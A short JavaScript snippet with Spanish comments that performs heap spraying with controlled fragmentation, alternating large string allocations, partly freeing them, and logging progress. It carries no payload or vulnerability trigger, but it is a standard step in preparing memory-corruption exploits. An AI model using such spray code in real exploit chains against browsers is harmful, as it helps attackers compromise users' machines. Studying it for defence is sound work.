(function() {
    const sprayArray = [];
    const objectSizeSmall = 0x444444; // Tamaño de objetos pequeños (~4 MB)
    const objectSizeLarge = 0x888888; // Tamaño de objetos grandes (~9 MB)
    const maxIterations = 200;
    const fragmentationPattern = [objectSizeSmall, objectSizeLarge];

    // Fragmentación controlada en bloques de diferente tamaño
    for (let i = 0; i < maxIterations; i++) {
        // Alternar tamaños entre iteraciones para crear fragmentación
        let currentSize = fragmentationPattern[i % fragmentationPattern.length];
        let sprayObject = "A".repeat(currentSize);
        sprayArray.push(sprayObject);

        // Liberar memoria periódicamente para no llegar al límite
        if (i % 50 === 0 && i !== 0) {
            console.log(`Liberando memoria en iteración ${i}`);
            sprayArray.splice(0, 25); // Liberar una parte de los objetos en lugar de todos
        }

        // Log para monitorear el progreso
        if (i % 20 === 0) {
            console.log(`Iteración ${i + 1} completada. Tamaño actual: ${currentSize.toString(16)}`);
        }
    }

    console.log("Heap spraying con fragmentación controlada completado.");
    alert("Heap spraying con fragmentación finalizado.");
})();
